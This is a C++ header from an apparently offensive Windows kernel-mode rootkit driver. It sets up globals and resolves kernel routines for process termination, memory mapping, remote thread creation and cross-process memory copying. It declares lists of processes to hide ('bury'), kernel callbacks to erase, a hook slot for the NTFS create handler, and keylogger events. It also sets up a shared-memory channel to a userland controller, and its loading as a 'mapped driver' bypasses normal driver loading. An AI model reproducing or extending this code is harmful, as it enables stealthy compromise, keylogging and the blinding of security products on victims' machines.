#pragma once

#include <ntifs.h>
#include <wdf.h>
#include "WinTypes.hpp"
#include "Vector.hpp"

//
// Function Prototypes
//
typedef NTSTATUS(*IOCREATEDRIVER)(IN PUNICODE_STRING DriverName, IN PDRIVER_INITIALIZE InitializationFunction);
typedef NTSTATUS(*ZWTERMINATEPROCESS)(IN HANDLE ProcessHandle OPTIONAL, IN NTSTATUS ExitStatus);
typedef NTSTATUS(*ZWOPENPROCESS)(OUT PHANDLE ProcessHandle, IN ACCESS_MASK DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes, IN PCLIENT_ID ClientId);
typedef NTSTATUS(*ZWCLOSE)(IN HANDLE Handle);
typedef NTSTATUS(*ZWPROTECTVIRTUALMEMORY)(IN HANDLE ProcessHandle, IN OUT PVOID BaseAddress, IN OUT PSIZE_T RegionSize, IN ULONG NewProtect, OUT PULONG OldProtect);
typedef NTSTATUS(*MMCOPYVIRTUALMEMORY)(IN PEPROCESS SourceProcess, IN PVOID SourceAddress, IN PEPROCESS TargetProcess, OUT PVOID TargetAddress, IN SIZE_T BufferSize, IN KPROCESSOR_MODE PreviousMode, OUT PSIZE_T ReturnSize);
typedef NTSTATUS(*PSSETCREATEPROCESSNOTIFYROUTINEEX)(IN PCREATE_PROCESS_NOTIFY_ROUTINE_EX NotifyRoutine, IN BOOLEAN Remove);
typedef NTSTATUS(*ZWQUERYSYSTEMINFORMATION)(IN SYSTEM_INFORMATION_CLASS SystemInformationClass, OUT PVOID SystemInformation, IN ULONG SystemInformationLength, OUT PULONG ReturnLength OPTIONAL);
typedef NTSTATUS(*OBREFERENCEOBJECTBYNAME)(PUNICODE_STRING ObjectName, ULONG Attributes, PACCESS_STATE AccessState, ACCESS_MASK DesiredAccess, POBJECT_TYPE ObjectType, KPROCESSOR_MODE AccessMode, PVOID ParseContext, PVOID Object);
typedef NTSTATUS(*ZWSETEVENT)(IN HANDLE EventHandle, OUT PIO_STATUS_BLOCK IoStatusBlock OPTIONAL);
typedef NTSTATUS(*ZWRESETEVENT)(IN HANDLE EventHandle, OUT PIO_STATUS_BLOCK IoStatusBlock OPTIONAL);
typedef NTSTATUS(*ZWCREATEEVENT)(OUT PHANDLE EventHandle, IN ACCESS_MASK DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL, IN EVENT_TYPE EventType, IN BOOLEAN InitialState);
typedef NTSTATUS(*ZWCREATESECTION)(OUT PHANDLE SectionHandle, IN ACCESS_MASK DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL, IN PLARGE_INTEGER MaximumSize OPTIONAL, IN ULONG SectionPageProtection, IN ULONG AllocationAttributes, IN HANDLE FileHandle OPTIONAL);
typedef NTSTATUS(*ZWMAPVIEWOFSECTION)(IN HANDLE SectionHandle, IN HANDLE ProcessHandle, OUT PVOID BaseAddress, IN ULONG_PTR ZeroBits, IN SIZE_T CommitSize, IN OUT PLARGE_INTEGER SectionOffset, IN OUT PSIZE_T ViewSize, IN SECTION_INHERIT InheritDisposition, IN ULONG AllocationType, IN ULONG Protect);
typedef NTSTATUS(*ZWUNMAPVIEWOFSECTION)(IN HANDLE ProcessHandle, IN PVOID BaseAddress);
typedef NTSTATUS(*ZWALLOCATEVIRTUALMEMORY)(IN HANDLE ProcessHandle, OUT PVOID BaseAddress, IN ULONG_PTR ZeroBits, OUT PSIZE_T RegionSize, IN ULONG AllocationType, IN ULONG PageProtection);
typedef NTSTATUS(*ZWCREATETHREADEX)(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, SIZE_T CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PPS_ATTRIBUTE_LIST AttributeList);

namespace BeGlobals
{
    PVOID NtOsKrnlAddr;
    PVOID Win32kBaseAddr;
    PDRIVER_OBJECT diskDriverObject;

    OBREFERENCEOBJECTBYNAME pObReferenceObjectByName;
    ZWQUERYSYSTEMINFORMATION pZwQuerySystemInformation;
    ZWTERMINATEPROCESS pZwTerminateProcess;
    ZWOPENPROCESS pZwOpenProcess;
    ZWCLOSE pZwClose;
    ZWPROTECTVIRTUALMEMORY pZwProtectVirtualMemory;
    MMCOPYVIRTUALMEMORY pMmCopyVirtualMemory;
    PSSETCREATEPROCESSNOTIFYROUTINEEX pPsSetCreateProcessNotifyRoutineEx;
    ZWMAPVIEWOFSECTION pZwMapViewOfSection;
    ZWCREATESECTION pZwCreateSection;
    ZWUNMAPVIEWOFSECTION pZwUnmapViewOfSection;
    ZWALLOCATEVIRTUALMEMORY pZwAllocateVirtualMemory;
    ZWCREATETHREADEX pZwCreateThreadEx;
    ZWCREATEEVENT pZwCreateEvent;
    ZWSETEVENT pZwSetEvent;
    ZWRESETEVENT pZwResetEvent;

    HANDLE WinLogonPid;
    PEPROCESS winLogonProc;
}

#include "Misc.hpp"

namespace BeGlobals
{
    //
    // For communication with the userland process
    //
    HANDLE hSharedMemory = NULL;
    PVOID  pSharedMemory = NULL;
    HANDLE commandEvent  = NULL;
    HANDLE answerEvent   = NULL;
}

#include "Injection.hpp"
#include "MemoryUtils.hpp"
#include "AddressUtils.hpp"
#include "AutoLock.hpp"

#define MAX_BURIED_PROCESSES 256
#define MAX_ERASE_CALLBACKS 256

typedef struct _WCHAR_ARRAY {
    WCHAR* array[MAX_BURIED_PROCESSES];
    INT length;
} WCHAR_ARRAY;

typedef struct _KERNEL_CALLBACK_RESTORE_INFO_ARRAY {
    LONG64 addrOfCallbackFunction[MAX_ERASE_CALLBACKS];
    LONG64 callbackToRestore[MAX_ERASE_CALLBACKS];
    CALLBACK_TYPE callbackType[MAX_ERASE_CALLBACKS];
    INT length;
} KERNEL_CALLBACK_RESTORE_INFO_ARRAY;

typedef NTSTATUS(NTAPI* NTFS_IRP_MJ_CREATE_FUNCTION)(PDEVICE_OBJECT DeviceObject, PIRP Irp);

namespace BeGlobals
{
    WCHAR_ARRAY beBuryTargetProcesses = { { NULL }, 0 };
    KERNEL_CALLBACK_RESTORE_INFO_ARRAY BeCallbacksToRestore = { { NULL }, { NULL }, { CallbackTypeNone }, 0 };

    //
    // Mutexes
    //
    FastMutex ProcessListLock = FastMutex();
    FastMutex CallbackLock = FastMutex();

    NTFS_IRP_MJ_CREATE_FUNCTION OriginalNTFS_IRP_MJ_CREATE_function = NULL;

    bool Shutdown = false;
    bool LogKeys  = false;

    KEVENT hKeyLoggerTerminationEvent;
    KEVENT hMainLoopTerminationEvent;

    NTSTATUS
    BeInitGlobals()
    {
        //
        // Get base address of modules
        //
        UNICODE_STRING Ntoskrnl   = RTL_CONSTANT_STRING(L"ntoskrnl.exe");
        UNICODE_STRING Win32kbase = RTL_CONSTANT_STRING(L"win32kbase.sys");
        NtOsKrnlAddr              = BeGetBaseAddrOfModule(&Ntoskrnl);
        Win32kBaseAddr            = BeGetBaseAddrOfModule(&Win32kbase);

        LOG_MSG("ntoskrnl.exe base addr: 0x%llx\n", (UINT64)NtOsKrnlAddr);
        LOG_MSG("Win32kbase.sys base addr: 0x%llx\n", (UINT64)Win32kBaseAddr);

        //
        // Since we are using a mapped driver, we should not try to access the header of our driver
        // instead we use the DISK driver as an object any time we need to access the header
        //
        pObReferenceObjectByName = (OBREFERENCEOBJECTBYNAME)BeGetSystemRoutineAddress("ntoskrnl.exe", "ObReferenceObjectByName");
        if (!pObReferenceObjectByName)
        {
            LOG_MSG("Failed to resolve ObReferenceObjectByName\n");
            return STATUS_NOT_FOUND;
        }

        UNICODE_STRING DriverName = RTL_CONSTANT_STRING(L"\\Driver\\disk");
        NTSTATUS status = BeGlobals::pObReferenceObjectByName(
            &DriverName,
            OBJ_CASE_INSENSITIVE,
            NULL,
            0,
            *IoDriverObjectType,
            KernelMode,
            NULL,
            (PVOID*)&BeGlobals::diskDriverObject
        );

        if (!NT_SUCCESS(status))
        {
            LOG_MSG("Failure on ObReferenceObjectByName\n");
            return status;
        }

        //
        // Init locks
        //
        ProcessListLock.Init();
        CallbackLock.Init();

        //
        // Function resolving
        //
        pZwTerminateProcess                = (ZWTERMINATEPROCESS)BeGetSystemRoutineAddress("ntoskrnl.exe", "ZwTerminateProcess");
        pZwOpenProcess                     = (ZWOPENPROCESS)BeGetSystemRoutineAddress("ntoskrnl.exe", "ZwOpenProcess");
        pZwClose                           = (ZWCLOSE)BeGetSystemRoutineAddress("ntoskrnl.exe", "ZwClose");
        pZwProtectVirtualMemory            = (ZWPROTECTVIRTUALMEMORY)BeGetSystemRoutineAddress("ntoskrnl.exe", "ZwProtectVirtualMemory");
        pZwAllocateVirtualMemory           = (ZWALLOCATEVIRTUALMEMORY)BeGetSystemRoutineAddress("ntoskrnl.exe", "ZwAllocateVirtualMemory");
        pZwCreateSection                   = (ZWCREATESECTION)BeGetSystemRoutineAddress("ntoskrnl.exe", "ZwCreateSection");
        pZwMapViewOfSection                = (ZWMAPVIEWOFSECTION)BeGetSystemRoutineAddress("ntoskrnl.exe", "ZwMapViewOfSection");
        pMmCopyVirtualMemory               = (MMCOPYVIRTUALMEMORY)BeGetSystemRoutineAddress("ntoskrnl.exe", "MmCopyVirtualMemory");
        pZwQuerySystemInformation          = (ZWQUERYSYSTEMINFORMATION)BeGetSystemRoutineAddress("ntoskrnl.exe", "ZwQuerySystemInformation");
        pPsSetCreateProcessNotifyRoutineEx = (PSSETCREATEPROCESSNOTIFYROUTINEEX)BeGetSystemRoutineAddress("ntoskrnl.exe", "PsSetCreateProcessNotifyRoutineEx");
        pZwUnmapViewOfSection              = (ZWUNMAPVIEWOFSECTION)BeGetSystemRoutineAddress("ntoskrnl.exe", "ZwUnmapViewOfSection");
        pZwCreateThreadEx                  = (ZWCREATETHREADEX)FindZwFunction("NtCreateThreadEx");
        pZwResetEvent                      = (ZWRESETEVENT)BeGetSystemRoutineAddress("ntoskrnl.exe", "ZwResetEvent");
        pZwCreateEvent                     = (ZWCREATEEVENT)BeGetSystemRoutineAddress("ntoskrnl.exe", "ZwCreateEvent");
        pZwSetEvent                        = (ZWSETEVENT)BeGetSystemRoutineAddress("ntoskrnl.exe", "ZwSetEvent");

        if (!(pZwTerminateProcess &&
            pZwOpenProcess &&
            pZwClose &&
            pZwCreateSection &&
            pZwMapViewOfSection &&
            pZwProtectVirtualMemory &&
            pMmCopyVirtualMemory &&
            pZwQuerySystemInformation &&
            pPsSetCreateProcessNotifyRoutineEx &&
            pZwAllocateVirtualMemory &&
            pZwUnmapViewOfSection))
        {
            LOG_MSG("Failed to resolve one or more functions\n");
            return STATUS_NOT_FOUND;
        }

        LOG_MSG("Resolved functions\n");

        //
        // Get winlogon PID to enable attaching to session space
        //
        UNICODE_STRING ProcessName = { 0 };
        RtlInitUnicodeString(&ProcessName, L"winlogon.exe");
        WinLogonPid = BeGetPidFromProcessName(ProcessName);

        LOG_MSG("Found winlogon PID: %lu\n", HandleToUlong(WinLogonPid));

        if (PsLookupProcessByProcessId(WinLogonPid, &winLogonProc))
        {
            return STATUS_NOT_FOUND;
        }

        //
        // Setup shared memory for interprocess communications
        //
        UNICODE_STRING commandEventName = RTL_CONSTANT_STRING(L"\\BaseNamedObjects\\Global\\BeCommandEvt");
        UNICODE_STRING answerEventName  = RTL_CONSTANT_STRING(L"\\BaseNamedObjects\\Global\\BeAnswerEvt");
        
        BeCreateNamedEvent(&commandEvent, &commandEventName, FALSE);
        BeCreateNamedEvent(&answerEvent, &answerEventName, FALSE);
        
        LOG_MSG("Created events\n");

        //
        // Setup shared memory for IPC
        //
        BeCreateSharedMemory();
        LOG_MSG("Created shared memory\n");

        KeInitializeEvent(&BeGlobals::hKeyLoggerTerminationEvent, NotificationEvent, FALSE);
        KeInitializeEvent(&BeGlobals::hMainLoopTerminationEvent, NotificationEvent, FALSE);
        LOG_MSG("Initialised termination events\n");

        return STATUS_SUCCESS;
    };
}
